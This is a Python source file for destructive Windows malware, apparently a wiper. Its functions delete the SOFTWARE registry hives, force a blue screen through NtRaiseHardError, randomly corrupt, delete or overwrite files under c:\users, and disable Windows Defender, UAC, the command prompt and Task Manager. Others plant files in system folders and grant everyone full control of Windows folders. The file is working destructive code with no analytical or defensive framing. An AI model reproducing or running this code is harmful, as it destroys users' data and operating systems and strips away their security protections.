import requests, subprocess, os, ctypes, winreg, include
import random as rand
import threading


userProfilePath = os.environ.get('USERPROFILE')


# to throw off triage
def ufck():
    # drop notepad in drivers folder
    try:
        with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
            npFile.write(bytes(include.notepad))
        with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
            npFile.write(bytes(include.notepad))
    except:
        print('wuh oh :-)')

    # set image as wallpaper
    with open(f'{userProfilePath}\\sigma.png', 'wb') as sigma:
        sigma.write(bytes(include.images[rand.randint(0,3)]))

    # change wallpaper
    do_command('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
    do_command(f'reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "{userProfilePath}\sigma.png" /f')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{userProfilePath}\\sigma.png', 3)


# mostly unused since everything is stored locally now
def downloadFile(url, filename):
    file = requests.get(url)
    with open(filename, 'wb') as npFile:
        npFile.write(file.content)


# cut down on code
def do_command(cmd):
    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)


# do funny registry
def regFuck(adm):
    try:
        if adm:
            funny = winreg.HKEY_LOCAL_MACHINE
            winreg.EnumKey(funny, 0)
            do_command('reg delete "HKLM\SOFTWARE\" /f')
        else:
            do_command('reg delete HKCU\SOFTWARE\ /f')
    except:
        print('bruh')

# throws a bugcheck 
def Bugcheck(code):
    try:
        # specify ntdll
        ntdl = ctypes.windll.ntdll

        # adjust privileges to do funny
        funny = ntdl.RtlAdjustPrivilege(19, True, False, ctypes.pointer(ctypes.c_bool()))

        #do the funny
        response = ctypes.c_ulong()
        funny = ntdl.NtRaiseHardError(code, 0, 0, 0, 6, ctypes.byref(response))
    except:
        print('you win!')
    

# corrupts file
def scramble(file, rename):
    # Opens the file and converts it to an array
    if not(rename):
        with open(file,'rb') as bFile:
            arrayList = list(bFile.read())


        # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
        #This for loop swaps values with neighboring ones            
        try:
            for i in range(round(len(arrayList)/10)):
                arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
        except:
            print('failed to shift file')

        #return bytearray
        byteArray = bytearray(arrayList)

        #export file
        finalFile = open(file, 'wb')
        finalFile.write(bytes(byteArray))
        finalFile.close()

        # rename file
        os.rename(file, os.path.splitext(file)[0] + '.mlbo')
    else:
        #export file
        finalFile = open(file, 'wb')
        finalFile.write(bytes(include.mb))
        finalFile.close()

        # rename file
        os.rename(file, os.path.splitext(file)[0] + '.scr')


# main corruption payload for threads
def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0, renameOnly=False):
    for j in range(cAmount):
        try:
            # init
            direc = 'c:\\users'

            #While loop for targeting random files
            while not(os.path.isfile(direc)): #shit straight up doesn't work
                try:
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)
                    direc = direc+'\\'+randChoice

                    # If statement if it finds a file
                    if os.path.isfile(direc):
                        if dbg:
                            print('found a file')
                        break
                except:
                    # take ownership of file if its readonly
                    if useAdmin != 0:
                        direc = 'c:\\'
                    else:
                        
                        direc = 'c:\\users'
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)
            
            # main destruction
            if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.splitext(direc)[1] == 'scr'):
                print('skip file')
            
            # plays random chance game with large files
            if (os.path.getsize(direc) >= 32000000):
                if rand.randint(1,100) == 1:
                    os.remove(direc)
                    
                    # debug
                    if dbg:
                        print('deleted file')
                else:
                    print('skip file')
            
            # corruption
            else:
                if ((rand.randint(1,100)) == 1):
                    # deletes file outright in 1/100 chance
                    os.remove(direc)

                    # debug log
                    if dbg:
                        print('deleted file')
                else:
                    # corrupt file
                    scramble(direc, renameOnly)
                    
                    # Debug log stuff
                    if dbg:
                        print(f'wrote to file as thread {thr}')
        except:
            # rerolls the file incase it errors out
            print('rerolling id: ' + str(j))

# disables defender and UAC prompt
def ripDefender():
    do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
    do_command('reg add "HKLM\SOFTWARE\Microsoft\PolicManager\default\Start" /v HideShutDown /t REG_DWORD /d 1 /f')
    do_command('reg add "HKLM\SOFTWARE\Microsoft\PolicManager\default\Start" /v HideRestart /t REG_DWORD /d 1 /f')
    do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')
    do_command('reg add "HKCR\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f')
    do_command('reg add "HKCR\Software\Policies\Microsoft\Windows\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def takeOwnership():
    # using threading so it doesnt take 5 hours
    directories = ['c:\\Windows\\*', 'c:\\Windows\\Fonts\\*', 'c:\\Windows\\inf\\*', 'c:\\Windows\\Boot\\*']

    # do important shit inside windows folder
    for index in directories:
        # boot folder is a special case so
        do_command(f'takeown /f {index} /r /d N')
        do_command(f'icacls {index} /grant everyone:(f) /t /c')

    # boot folder is a special case so
    do_command('takeown /f c:\\windows\\Boot\\ /r /d N')
    do_command('icacls c:\\windows\\Boot\\ /grant everyone:(f) /t /c')
